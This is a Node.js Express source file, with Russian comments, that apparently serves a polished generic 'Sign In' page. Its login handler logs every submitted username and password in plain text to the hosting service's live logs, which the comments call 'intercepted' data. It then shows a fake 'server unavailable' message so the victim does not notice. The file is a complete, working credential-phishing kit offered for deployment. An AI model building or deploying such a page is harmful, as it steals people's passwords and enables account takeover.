const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Обязательно: учим сервер читать данные из HTML-форм
app.use(express.urlencoded({ extended: true }));

// 1. ОТОБРАЖЕНИЕ СТРАНИЦЫ ДЛЯ ПОЛЬЗОВАТЕЛЯ
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign In</title>
    <style>
        /* ================================================== */
        /*         МЕСТО ДЛЯ ОФОРМЛЕНИЯ (ЗАДНИЙ ПЛАН / ШРИФТ)  */
        /* ================================================== */
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background-color: #191b1f; /* Сюда можно добавить картинку фона */
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }

        .auth-container { 
            background-color: #2b2d32; /* Сюда можно добавить прозрачность */
            padding: 45px 30px 30px 30px; 
            border-radius: 8px; 
            width: 100%;
            max-width: 380px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            box-sizing: border-box;
        }

        /* ================================================== */
        /*                ПОЛЯ ВВОДА И ИХ АНИМАЦИЯ            */
        /* ================================================== */
        .input-control { 
            width: 100%; 
            padding: 12px; 
            margin-bottom: 15px; 
            background-color: #383b40; 
            border: 1px solid #4a4e54; 
            border-radius: 6px; 
            color: #ffffff; 
            font-size: 15px; 
            box-sizing: border-box; 
            /* Плавность анимации при клике в поле */
            transition: all 0.2s ease-in-out; 
        }
        .input-control::placeholder { color: #a0a5ab; }
        
        /* АНИМАЦИЯ: Эффект фокуса при клике на текстовое поле */
        .input-control:focus { 
            outline: none; 
            border-color: #ffffff; 
            background-color: #3f434a;
            transform: scale(1.01); /* Поле микроскопически увеличивается */
        }
        
        /* ================================================== */
        /*              ГЛАВНАЯ КНОПКА (LOG IN) И АНИМАЦИЯ     */
        /* ================================================== */
        .btn-submit { 
            width: 100%; 
            padding: 12px; 
            background-color: transparent; 
            border: 1px solid #ffffff; 
            border-radius: 6px; 
            color: #ffffff; 
            font-size: 16px; 
            font-weight: 500; 
            cursor: pointer; 
            margin-bottom: 20px; 
            box-sizing: border-box;
            /* Плавность переходов для анимации наведения и нажатия */
            transition: background-color 0.2s ease, transform 0.1s ease; 
        }
        
        /* АНИМАЦИЯ: Плавная заливка при наведении мыши на Log In */
        .btn-submit:hover { 
            background-color: rgba(255, 255, 255, 0.15); 
        }
        
        /* АНИМАЦИЯ: Эффект упругого сжатия при физическом клике */
        .btn-submit:active { 
            transform: scale(0.95); /* Кнопка заметно вдавливается внутрь */
            background-color: rgba(255, 255, 255, 0.25);
        }
        
        /* ================================================== */
        /*        ДОПОЛНИТЕЛЬНЫЕ КНОПКИ И ИХ АНИМАЦИЯ          */
        /* ================================================== */
        .secondary-actions { border-top: 1px solid #3f434a; padding-top: 20px; margin-top: 20px; }
        
        .btn-secondary { 
            width: 100%; 
            padding: 12px; 
            background-color: #383b40; 
            border: none; 
            border-radius: 6px; 
            color: #ffffff; 
            font-size: 15px; 
            cursor: pointer; 
            margin-bottom: 10px; 
            text-align: center; 
            box-sizing: border-box;
            /* Плавность перехода анимации */
            transition: background-color 0.2s ease, transform 0.1s ease; 
        }
        
        /* АНИМАЦИЯ: Осветление кнопки при наведении */
        .btn-secondary:hover { 
            background-color: #484c54; 
        }
        
        /* АНИМАЦИЯ: Сжатие кнопки при клике */
        .btn-secondary:active { 
            transform: scale(0.96); 
        }
        
        /* Ссылки */
        .link-text { display: block; text-align: center; color: #ffffff; font-size: 14px; text-decoration: none; margin: 15px 0; transition: color 0.2s; }
        .link-text:hover { text-decoration: underline; color: #cbd5e1; }
    </style>
</head>
<body>
<div class="auth-container">
    
    <!-- Заголовок формы (ОФОРМЛЕНИЕ: по заданию) -->
    <h2 style="color: #ffffff; text-align: center; margin-top: 0; margin-bottom: 25px; font-size: 24px; font-weight: 600;">
        Sign In
    </h2>
    
    <form action="/login" method="POST">
        <input type="text" name="username" class="input-control" placeholder="Login / Email" required>
        <input type="password" name="password" class="input-control" placeholder="Password" required>
        <button type="submit" class="btn-submit">Log In</button>
    </form>

    <a href="#" class="link-text">Forgot password?</a>
    
    <div class="secondary-actions">
        <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
        <button type="button" class="btn-secondary">Quick Sign-in</button>
    </div>
    
    <a href="#" class="link-text" style="margin-top: 20px;">Create an account</a>
</div>
</body>
</html>
    `);
});

// 2. БЭКЕНД: ОБРАБОТКА ДАННЫХ И ИХ ОТПРАВКА В ОНЛАЙН-ЛОГИ
app.post('/login', (req, res) => {
    const userLogin = req.body.username;
    const userPassword = req.body.password;
    
    // Вывод полученных текстовых параметров в панель управления (Logs) Render в реальном времени
    console.log(`\n========================================`);
    console.log(`[БЭКЕНД] ДАННЫЕ УСПЕШНО ПЕРЕХВАЧЕНЫ И ЗАФИКСИРОВАНЫ:`);
    console.log(`ЛОГИН: ${userLogin}`);
    console.log(`ПАРОЛЬ: ${userPassword}`);
    console.log(`========================================`);
    
    // Ответ клиенту в браузер (заглушка об обслуживании)
    res.status(503).send('Сервер временно недоступен. Пожалуйста, попробуйте войти позже.');
});

// Запуск сервера на указанном порту
app.listen(PORT, () => {
    console.log("=== СЕРВЕР УСПЕШНО ЗАПУЩЕН ===");
});
